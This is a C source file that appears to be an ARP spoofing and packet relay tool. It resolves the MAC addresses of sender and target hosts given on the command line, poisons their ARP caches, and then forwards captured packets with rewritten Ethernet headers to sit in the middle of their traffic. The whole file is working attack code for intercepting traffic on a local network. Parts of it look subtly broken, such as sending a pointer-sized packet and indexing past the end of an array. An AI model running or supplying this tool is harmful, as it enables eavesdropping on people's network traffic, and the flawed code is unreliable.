#include "header.h"

static packet packet;
void packet_relay(char*dev, u_char *my_mac, int argc, char **argv){
    int res;
    struct pcap_pkthdr *header;
    const unsigned char *packet_read;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    uint32_t SenIP;
    uint32_t TarIP;
    u_char** sen_mac = (u_char**)malloc(sizeof(u_char*)*((argc-2)/2));
    u_char** tar_mac = (u_char**)malloc(sizeof(u_char*)*((argc-2)/2));
    for(int k=0; k<(argc-2)/2; k++)
    {
        sen_mac[k] = (u_char*)malloc(sizeof(u_char)*6);
        tar_mac[k] = (u_char*)malloc(sizeof(u_char)*6);
    }

    int l =0;
    int k=0;
    int w=0;
        for(int i = 2; i < argc;i += 2){
            SenIP = inet_addr(argv[i]); //argv[2] = Sender IP
            TarIP = inet_addr(argv[i+1]); //argv[3] = Target IP
            my_mac = get_mymac(dev); //Get MyMac
            printf("k : %d \n",k);
            memcpy(sen_mac[k],get_senmac(dev, my_mac, SenIP),6); //Get TarMac
            memcpy(tar_mac[k],get_senmac(dev, my_mac, TarIP),6); //Get TarMac
            k += 1;
        }
        l = 0;
        for(int i = 2; i < argc;i += 2){
            SenIP = inet_addr(argv[i]); //argv[2] = Sender IP
            TarIP = inet_addr(argv[i+1]); //argv[3] = Target IP
            my_mac = get_mymac(dev); //Get MyMac
            printf("l : %d \n",l);

            arp_spoof(dev, my_mac, sen_mac[l], SenIP, TarIP); //ARP Spoofs
            l += 1;
        }
        while(1){

            res=pcap_next_ex(handle, &header, &packet_read);
            printf("%02x", packet_read[29]);
            if(res==1 && (packet_read[29] == 0x02 || packet_read[29] == 0x01)){
                memcpy((u_char*)&packet_read[6],&my_mac[0],6);
                memcpy((u_char*)&packet_read[0],&tar_mac[l][0],6);
                pcap_sendpacket(handle,(u_char*)&packet_read, sizeof(packet_read));
                printf("RELAY PACKET SEND! \n");
            }else {
                printf("PACKET WAITING...\n");
            }
            for(w=0;w < (argc-2)/2;w++){
            if(res==1 && ((packet_read[6]==sen_mac[w][0]&&packet_read[20] == 0x00 &&packet_read[21] == 0x02) || (packet_read[6]==sen_mac[w][0]&&packet_read[20] == 0x00 &&packet_read[21] == 0x01))){
                l = 0;
                for(int i = 2; i < argc;i += 2){
                    SenIP = inet_addr(argv[i]); //argv[2] = Sender IP
                    TarIP = inet_addr(argv[i+1]); //argv[3] = Target IP
                    my_mac = get_mymac(dev); //Get MyMac
                    printf("l : %d \n",l);

                    arp_spoof(dev, my_mac, sen_mac[l], SenIP, TarIP); //ARP Spoofs
                    l += 1;

                }
            }
        }
        }pcap_close(handle);return;
    }

